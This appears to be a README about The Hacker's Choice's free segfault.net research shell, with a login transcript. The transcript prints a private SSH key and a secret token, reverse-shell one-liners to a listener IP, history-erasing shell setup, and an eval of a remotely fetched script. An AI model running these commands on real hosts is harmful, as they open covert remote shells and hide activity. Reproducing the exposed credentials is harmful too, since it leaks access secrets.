# The Hacker's Choice

> ## Who we are and what we do
>
> We are a group of international hackers.
>
> We do IT security work. We are not for hire. All of our work is for the public.
>
> We research and publish tools and academic papers to expose fishy IT security that just isn’t secure. We also develop and publish tools to help the IT Security movement.

## 公益跳板机（研究、学术性质）

`ssh root@segfault.net`，密码 `segfault`

```bash
$ ssh root@segfault.net
🦋 This is a Free SERVICE for researchers, developers and unix enthusiasts 👍
root@segfault.net's password: 
######################################################################
#### DISCLAIMER: TO BE USED FOR CREATIVE AND GOOD PURPOSES ONLY.. ####
#### TO TINKER AND TO EXPLORE.     >>>USE AT YOUR OWN RISK<<<     ####
######################################################################
----------------------------------------------------------------------
You are using the FREE TIER without a TOKEN. Various restrictions
apply:

- You have to wait 30 seconds ❤
- Your network traffic is metered and at snail speed 🙈
- Your CPU power and memory are limited 🙉
- Your server is subject to automated ban 🙊
- Your server will shut down on log out 💩

Read 👉 https://thc.org/sf/token 👈 to remove these restrictions. ❤

After login, see your restrictions by typing: cat /config/self/limits
----------------------------------------------------------------------
Read https://thc.org/sf/faq as well. 📖
----------------------------------------------------------------------


Press any key to continue (you have 10 seconds).

Creating Server TargetIce.........................................[OK]
:Cut & Paste these lines to your workstation's shell to retain access:
######################################################################
cat >~/.ssh/id_sf-lsd-segfault-net <<'__EOF__'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACB3jmp/3JyvY9ABgjrx4+sBnQ0T+yHsB4HTBMcJqC2OtgAAAIiJ9mzOifZs
zgAAAAtzc2gtZWQyNTUxOQAAACB3jmp/3JyvY9ABgjrx4+sBnQ0T+yHsB4HTBMcJqC2Otg
AAAEAs6YNqZSzAfZDl5/vDOB0vv7EZMxMUc/fEipuZ9A3eCHeOan/cnK9j0AGCOvHj6wGd
DRP7IewHgdMExwmoLY62AAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
__EOF__
cat >>~/.ssh/config <<'__EOF__'
host targetice
    User root
    HostName lsd.segfault.net
    IdentityFile ~/.ssh/id_sf-lsd-segfault-net
    SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ
    LocalForward 5900 0:5900
__EOF__
chmod 600 ~/.ssh/config ~/.ssh/id_sf-lsd-segfault-net
######################################################################
Thereafter use these commands:
--> ssh  targetice
--> sftp targetice
--> scp  targetice:stuff.tar.gz ~/
--> sshfs -o reconnect targetice:/sec ~/sec 
----------------------------------------------------------------------
Token             : No See https://thc.org/segfault/token
Your workstation  : *.*.*.*     (Hong Kong/Hong Kong)
Reverse Port      : Type curl sf/port for reverse port.
Exit cryptostorm  : 207.244.108.40  (Washington DC)
Exit mullvad      : 154.47.16.59    (Bogota/Colombia)
TOR Proxy         : 172.20.0.111:9050
Shared storage    : /everyone/TargetIce        (encrypted)
Your storage      : /sec                       (encrypted)
Your Onion WWW    : /onion                     (encrypted)
Your Web Page     : http://ftk4x6klwl5uwkgk75smxlod5hvxy4ayjct42vicubivznxjx5fyilyd.onion/targetice/
SSH               : ssh -o "SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ" root@lsd.segfault.net
SSH (TOR)         : torsocks ssh -o "SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ" root@pwazc2ops4uitnwgmu6pkgqtyaoou5d3an4jvbfya3xrz2k63pfqawyd.onion
SSH (gsocket)     : gsocket -s OGUyNjdhNmEM ssh -o "SetEnv SECRET=isWsapyEBOrHmEmHzfoRFMDJ" root@lsd.segfault.gsocket
SECRET            : isWsapyEBOrHmEmHzfoRFMDJ <<<  WRITE THIS DOWN  <<<

┌──(root💀lsd-TargetIce)-[~]
└─# id
uid=0(root) gid=0(root) groups=0(root)

┌──(root💀lsd-TargetIce)-[/tmp]
└─# curl sf/port
🌎 Tip: Type cat /config/self/reverse_* for details.
🤭 Tip: Type rshell to start listening.
🛜 Tip: Type curl sf/port to assign a new port.
👾 Your reverse Port is 207.244.108.40 61759 [207.244.108.40:61759]
                                                                                                                                                         
┌──(root💀lsd-TargetIce)-[/tmp]
└─# rshell      
Use one of these commands on the remote system:
    1. bash -c '(exec bash -i &>/dev/tcp/207.244.108.40/61759 0>&1) &'
    2. U=/tmp/.$$;rm -f $U;touch $U;(tail -f $U|sh 2>&1|telnet 207.244.108.40 61759 >$U 2>&1 &)
Once connected, cut & paste the following into the _this_ shell:
-------------------------------------------------------------------------------
 "$SHELL" -c true || SHELL=$(command -v bash) || SHELL=/bin/sh
 xc="import pty; pty.spawn('${SHELL:-sh}')"
 python -c 'import pty;' 2>/dev/null && python -c "$xc" \
    || { python3 -c 'import pty;' 2>/dev/null && python3 -c "$xc"; } \
    || { command -v script >/dev/null && script -qc "${SHELL:-sh}" /dev/null; }
unset HISTFILE
export SHELL=/bin/bash TERM=xterm-256color
export LESSHISTFILE=-
export REDISCLI_HISTFILE=/dev/null
export MYSQL_HISTFILE=/dev/null
alias ssh='ssh -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
alias scp='scp -o UpdateHostKeys=no -o StrictHostKeyChecking=no -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-dss'
alias wget='wget --no-hsts'
alias vi='vi -i NONE'
alias vim='vim -i NONE'
reset -I
PS1='\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]\$ '
stty -echo cols 200;printf "\033[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;25;80}"|awk -F";" '{ printf "rows "$2" cols "$3; }')
-------------------------------------------------------------------------------
 eval "$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
-------------------------------------------------------------------------------
To force-exit this listener, type kill "$(pgrep -P 239)" on your Root Server
Listening on 207.244.108.40:61759
listening on [any] 61759 ...

```

refer to https://github.com/hackerschoice/segfault.git

which leads to make a self-host segfault like server

## other

1. 公益 Telegram 代理，https://www.thc.org/t/
2. 公益邮件转发服务，`curl 'https://mail.thc.org/register?name=foobar&to=hackbart@tuta.io'`

## refer

1. https://www.thc.org